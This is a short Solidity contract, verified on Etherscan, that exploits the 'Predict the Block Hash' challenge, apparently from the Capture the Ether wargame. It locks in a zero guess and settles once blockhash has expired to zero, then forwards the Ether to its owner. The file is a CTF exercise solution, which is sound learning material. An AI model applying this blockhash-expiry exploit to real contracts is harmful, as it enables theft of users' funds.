/**
 *Submitted for verification at Etherscan.io on 2021-11-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PredictTheBlockHashChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(bytes32 hash) external payable;

    function settle() external;
}

contract ExploitPredictTheBlockHashChallenge {
    address owner;
    PredictTheBlockHashChallenge PBHC;
    
    constructor (address _address) {
        owner = msg.sender;
        PBHC = PredictTheBlockHashChallenge(_address);
    }
    
    function lockInGuess() external payable {
        PBHC.lockInGuess{value: 1 ether}(0);
    }

    function attack() external payable {
        PBHC.settle();
        
        require(PBHC.isComplete(), "Not Completed");
        
        (bool sent, ) = owner.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}